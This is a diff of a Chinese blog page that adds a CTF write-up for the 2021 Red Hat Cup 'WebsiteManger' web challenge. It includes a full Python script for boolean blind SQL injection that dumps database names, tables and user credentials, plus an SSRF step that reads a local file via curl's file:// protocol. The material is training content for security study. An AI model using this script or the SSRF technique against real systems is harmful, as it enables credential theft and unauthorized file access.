@@ -26,8 +26,14 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic1.imgdb.cn/i/033stVm2VSk4XyIzWpiWlL.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/i/033stfDT86eaa659oEu2Mt.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034JO0r2TV6rtyB6Wlnqsl.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034JNlxCizbBOQuhqpZdBH.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034JNrqlQyW87RMr08GZuX.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034JNsOWukAZuCrZPkWO6F.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034JNvjCBZvk7zN34KS2JO.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/i/034JO05F4z8z46MbLI8APy.png">
 <meta property="article:published_time" content="2021-04-14T05:18:00.000Z">
-<meta property="article:modified_time" content="2026-09-04T20:57:38.520Z">
+<meta property="article:modified_time" content="2026-09-05T06:54:12.207Z">
 <meta property="article:author" content="ALL">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -149,7 +155,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2021 第四届红帽杯网络安全大赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-it%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-show-source-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">find_it（信息收集 + show_source() 绕过）</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2021 第四届红帽杯网络安全大赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-it%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-show-source-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">find_it（信息收集 + show_source() 绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebsiteManger%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87-SSRF-file-%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">WebsiteManger（布尔盲注 + 注释绕过 + SSRF + file 协议）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -285,6 +291,19 @@
 
 <p>然后再访问 <code>hack.php</code> 即可拿到 flag</p>
 <p><img src="https://pic1.imgdb.cn/i/033stfDT86eaa659oEu2Mt.png" alt="pasted_1784572236806_hi6622.png"></p>
+<h3 id="WebsiteManger（布尔盲注-注释绕过-SSRF-file-协议）"><a href="#WebsiteManger（布尔盲注-注释绕过-SSRF-file-协议）" class="headerlink" title="WebsiteManger（布尔盲注 + 注释绕过 + SSRF + file 协议）"></a>WebsiteManger（布尔盲注 + 注释绕过 + SSRF + file 协议）</h3><p><img src="https://pic1.imgdb.cn/i/034JO0r2TV6rtyB6Wlnqsl.png" alt="pasted_1788591197562_xd05td.png"></p>
+<p>进入页面后是登录框，真正的突破口在页面源码里的图片接口</p>
+<p><img src="https://pic1.imgdb.cn/i/034JNlxCizbBOQuhqpZdBH.png" alt="pasted_1788590609610_lenw2x.png"></p>
+<p>经过测试存在布尔盲注，但是过滤了空格和双引号，用 <code>/**/</code> 代替空格</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://你的靶机地址/image.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用会话保持连接</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断注入条件是否为真</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_true</span>(<span class="params">condition: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="comment"># 构造 SQL 注入 payload，用 /**/ 绕过空格过滤</span></span><br><span class="line">    payload = <span class="string">f&quot;-2/**/or/**/(<span class="subst">&#123;condition&#125;</span>)&quot;</span></span><br><span class="line">    <span class="comment"># 发送 GET 请求，携带 id 参数</span></span><br><span class="line">    r = session.get(BASE_URL, params=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;, timeout=<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 此处以响应长度 &gt;1024 作为真值判断</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(r.text) &gt; <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过二分法盲注获取 SQL 查询结果（字符串）</span></span><br><span class="line"><span class="comment"># sql: 要执行的 SQL 语句（查询单行单列），max_len: 最大长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_string</span>(<span class="params">sql: <span class="built_in">str</span>, max_len: <span class="built_in">int</span> = <span class="number">80</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>  <span class="comment"># 存储已获取的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将 SQL 中的空格替换为 /**/ 以绕过过滤</span></span><br><span class="line">    sql = sql.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逐字符获取，位置从 1 开始</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_len + <span class="number">1</span>):</span><br><span class="line">        low, high = <span class="number">32</span>, <span class="number">127</span>  <span class="comment"># 可打印ASCII范围（空格~~）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 二分查找当前字符的 ASCII 码</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            <span class="comment"># 构造条件：当前字符 ASCII 码大于 mid</span></span><br><span class="line">            condition = <span class="string">f&quot;ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> is_true(condition):</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果得到空格（32），说明到达字符串末尾，结束</span></span><br><span class="line">        <span class="keyword">if</span> low == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将 ASCII 码转为字符并追加到结果</span></span><br><span class="line">        result += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(result)  <span class="comment"># 实时输出当前进度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----- 开始信息收集 -----</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] database:&quot;</span>)</span><br><span class="line">db = dump_string(<span class="string">&quot;select database()&quot;</span>, <span class="number">50</span>)   <span class="comment"># 获取当前数据库名</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] tables:&quot;</span>)</span><br><span class="line">tables = dump_string(</span><br><span class="line">    <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;&quot;</span>,</span><br><span class="line">    <span class="number">100</span></span><br><span class="line">)   <span class="comment"># 获取 ctf 库中的所有表名</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] columns:&quot;</span>)</span><br><span class="line">columns = dump_string(</span><br><span class="line">    <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;&quot;</span>,</span><br><span class="line">    <span class="number">100</span></span><br><span class="line">)   <span class="comment"># 获取 users 表中的所有列名</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] users:&quot;</span>)</span><br><span class="line">users = dump_string(</span><br><span class="line">    <span class="string">&quot;select group_concat(username,0x3a,password) from ctf.users&quot;</span>,</span><br><span class="line">    <span class="number">100</span></span><br><span class="line">)   <span class="comment"># 获取用户名和密码（用冒号分隔）</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/i/034JNrqlQyW87RMr08GZuX.png" alt="pasted_1788590841462_metsii.png"></p>
+<p>爆破出账号密码后登录成功</p>
+<p><img src="https://pic1.imgdb.cn/i/034JNsOWukAZuCrZPkWO6F.png" alt="pasted_1788590864059_cvugc0.png"></p>
+<p>读取测试输入 <a target="_blank" rel="noopener" href="http://127.0.0.1/%EF%BC%8C%E7%BD%91%E9%A1%B5%E5%9B%9E%E6%98%BE%E5%90%8E%E7%AB%AF%E4%BD%BF%E7%94%A8%E7%9A%84">http://127.0.0.1/，网页回显后端使用的</a> <code>curl</code> 命令</p>
+<p><img src="https://pic1.imgdb.cn/i/034JNvjCBZvk7zN34KS2JO.png" alt="pasted_1788590995225_z22yv2.png"></p>
+<p>推测存在 SSRF，<code>curl</code> 命令是支持 <code>file://</code> 协议的，所以可以尝试 <code>file:///flag</code> 读取本地文件</p>
+<p><img src="https://pic1.imgdb.cn/i/034JO05F4z8z46MbLI8APy.png" alt="pasted_1788591165950_tatin5.png"></p>
 
     </div>
     <footer class="article-footer">
@@ -296,19 +315,19 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="2021 第五空间智能安全大赛 WriteUp" class="lazyload">
-        <a href="/2021/04/14/2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" aria-label="前一篇: 2021 第五空间智能安全大赛 WriteUp" title="前一篇: 2021 第五空间智能安全大赛 WriteUp"></a>
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="b2evolution CMS SQL 注入（CVE-2021-28242）" class="lazyload">
+        <a href="/2021/05/26/b2evolution%20CMS%20SQL%20%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2021-28242%EF%BC%89/" aria-label="前一篇: b2evolution CMS SQL 注入（CVE-2021-28242）" title="前一篇: b2evolution CMS SQL 注入（CVE-2021-28242）"></a>
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
-            2021 第五空间智能安全大赛 WriteUp
+            b2evolution CMS SQL 注入（CVE-2021-28242）
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/images/banner.webp" data-sizes="auto" alt="2020 BJDCTF WriteUp" class="lazyload">
-      <a href="/2020/04/14/2020%20BJDCTF/" aria-label="后一篇: 2020 BJDCTF WriteUp"  title="后一篇: 2020 BJDCTF WriteUp"></a>
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="2021 第五空间智能安全大赛 WriteUp" class="lazyload">
+      <a href="/2021/04/14/2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" aria-label="后一篇: 2021 第五空间智能安全大赛 WriteUp"  title="后一篇: 2021 第五空间智能安全大赛 WriteUp"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
-          2020 BJDCTF WriteUp
+          2021 第五空间智能安全大赛 WriteUp
       </h3>
     </div>
   </nav>
@@ -335,10 +354,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        309.4k
+        310k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        25:11
+        25:13
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -360,7 +379,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2021 第四届红帽杯网络安全大赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-it%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-show-source-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">find_it（信息收集 + show_source() 绕过）</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2021 第四届红帽杯网络安全大赛 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-it%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-show-source-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">find_it（信息收集 + show_source() 绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebsiteManger%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87-SSRF-file-%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">WebsiteManger（布尔盲注 + 注释绕过 + SSRF + file 协议）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -494,7 +513,7 @@
           description: "",
           stripContent: "2021 第四届红帽杯网络安全大赛 WriteUp🏛️ 组织架构  指导单位：广东省公安厅、共青团广东省委员会、广东省教育厅、黄埔区政府  主办单位：广东省计算机信息网络安全协会  承办单位：广东科信安信息技术有限公司、网安联认证服务有限公司  协办单位：广东关键信息基础设施保护中心、广州竞远安全技术股份有限公司、深圳市网安计算机安全检测技术有限公司  技术支持：北京永信至诚科技股份有限公司   📊 赛事规模  参赛规模：共吸引 2844 支战队、近 6700 人次报名参赛  🏅 决赛获奖",
           date: "Wed Apr 14 2021 13:18:00 GMT+0800",
-          updated: "Sat Sep 05 2026 04:57:38 GMT+0800",
+          updated: "Sat Sep 05 2026 14:54:12 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
